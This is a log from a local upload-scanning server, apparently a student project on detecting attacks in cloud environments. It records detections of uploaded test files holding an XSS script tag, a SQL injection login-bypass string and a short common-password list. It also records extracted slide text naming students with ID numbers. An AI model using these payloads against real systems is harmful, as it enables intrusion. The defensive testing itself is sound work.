2025-02-24 10:15:09,397 - Malicious pattern detected in temp_extracted/1/1.sql
2025-02-24 10:15:09,397 - Malicious file detected in ZIP: temp_extracted/1/1.sql
2025-02-24 10:15:09,397 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-02-24 10:15:09,398 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-24 10:15:09,399 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-24 10:15:09,401 - 127.0.0.1 - - [24/Feb/2025 10:15:09] "[32mPOST /upload-folder HTTP/1.1[0m" 302 -
2025-02-24 10:15:09,403 - 127.0.0.1 - - [24/Feb/2025 10:15:09] "GET / HTTP/1.1" 200 -
2025-02-24 10:16:45,465 - Extracted content from uploads/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-24 10:16:45,465 - Malicious pattern detected in uploads/1.sql
2025-02-24 10:16:45,466 - 127.0.0.1 - - [24/Feb/2025 10:16:45] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-24 10:16:45,470 - 127.0.0.1 - - [24/Feb/2025 10:16:45] "GET / HTTP/1.1" 200 -
2025-02-24 10:16:52,259 - Extracted content from uploads/B_6_V_3.pptx: JCS1832 PROJECT WORK PHASE - IIPERCEIVING AND PREVENTING ATTACKS IN CLOUD ENVIRONMENTVIVA VOCEDate: 24-02-2025 BATCH NO: 06
PRESENTED BY
PRIYA DHARSHINI A(130721104061)
RAJESHWARI B(130721104067)
SADHANA N(130721104072)
SUPERVISED  BY 
Mrs. P. MAHALAKSHMI
ASSISTANT PROFESSOR(CSE)
JERUSALEM COLLEGE OF ENGINEERING, CHENNAI-100

         DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
<number>
Department of CSE Jerusalem College of Engineering
Feb 23, 2025
OBJECTIVE
<number>
Department of CSE
Je
2025-02-24 10:16:52,264 - 127.0.0.1 - - [24/Feb/2025 10:16:52] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-24 10:16:52,266 - 127.0.0.1 - - [24/Feb/2025 10:16:52] "GET / HTTP/1.1" 200 -
2025-03-12 20:00:13,755 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-03-12 20:00:13,755 - [33mPress CTRL+C to quit[0m
2025-03-12 20:00:46,989 - Extracted content from uploads/B_6_R_2.pptx: JCS1832 PROJECT WORK PHASE - IIPERCEIVING AND PREVENTING ATTACKS IN CLOUD ENVIRONMENTVIVA VOCEDate: 24-02-2025 BATCH NO: 06
PRESENTED BY
PRIYA DHARSHINI A(130721104061)
RAJESHWARI B(130721104067)
SADHANA N(130721104072)
SUPERVISED  BY 
Mrs. P. MAHALAKSHMI
ASSISTANT PROFESSOR(CSE)
JERUSALEM COLLEGE OF ENGINEERING, CHENNAI-100

         DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
<number>
Department of CSE Jerusalem College of Engineering
Feb 23, 2025
OBJECTIVE
<number>
Department of CSE
Je
2025-03-12 20:00:47,027 - Embedded object detected in uploads/B_6_R_2.pptx
2025-03-12 20:00:47,027 - Moved B_6_R_2.pptx to trash due to suspicious content.
2025-03-12 20:00:47,058 - Extracted content from uploads/B_6_V_3.pptx: JCS1832 PROJECT WORK PHASE - IIPERCEIVING AND PREVENTING ATTACKS IN CLOUD ENVIRONMENTVIVA VOCEDate: 24-02-2025 BATCH NO: 06
PRESENTED BY
PRIYA DHARSHINI A(130721104061)
RAJESHWARI B(130721104067)
SADHANA N(130721104072)
SUPERVISED  BY 
Mrs. P. MAHALAKSHMI
ASSISTANT PROFESSOR(CSE)
JERUSALEM COLLEGE OF ENGINEERING, CHENNAI-100

         DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING
<number>
Department of CSE Jerusalem College of Engineering
Feb 23, 2025
OBJECTIVE
<number>
Department of CSE
Je
2025-03-12 20:00:47,101 - Embedded object detected in uploads/B_6_V_3.pptx
2025-03-12 20:00:47,101 - Moved B_6_V_3.pptx to trash due to suspicious content.
2025-03-12 20:00:47,104 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-03-12 20:00:47,107 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-03-12 20:00:47,110 - Extracted content from uploads/test/test/2 (copy).yaml: <script>alert('Hacked!');</script>

2025-03-12 20:00:47,113 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-03-12 20:00:47,122 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-03-12 20:01:03,670 - 127.0.0.1 - - [12/Mar/2025 20:01:03] "GET / HTTP/1.1" 200 -
2025-03-12 20:01:04,521 - 127.0.0.1 - - [12/Mar/2025 20:01:04] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
2025-03-12 20:01:07,166 - 127.0.0.1 - - [12/Mar/2025 20:01:07] "GET / HTTP/1.1" 200 -
2025-03-12 20:01:08,137 - 127.0.0.1 - - [12/Mar/2025 20:01:08] "GET / HTTP/1.1" 200 -
2025-03-12 20:01:11,114 - 127.0.0.1 - - [12/Mar/2025 20:01:11] "[32mGET /delete/1 HTTP/1.1[0m" 302 -
2025-03-12 20:01:11,119 - 127.0.0.1 - - [12/Mar/2025 20:01:11] "GET / HTTP/1.1" 200 -
2025-03-12 20:01:12,325 - 127.0.0.1 - - [12/Mar/2025 20:01:12] "[32mGET /delete/2 HTTP/1.1[0m" 302 -
2025-03-12 20:01:12,331 - 127.0.0.1 - - [12/Mar/2025 20:01:12] "GET / HTTP/1.1" 200 -
2025-03-12 20:02:11,259 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-03-12 20:02:11,259 - [33mPress CTRL+C to quit[0m
2025-03-12 20:02:17,732 - 127.0.0.1 - - [12/Mar/2025 20:02:17] "GET / HTTP/1.1" 200 -
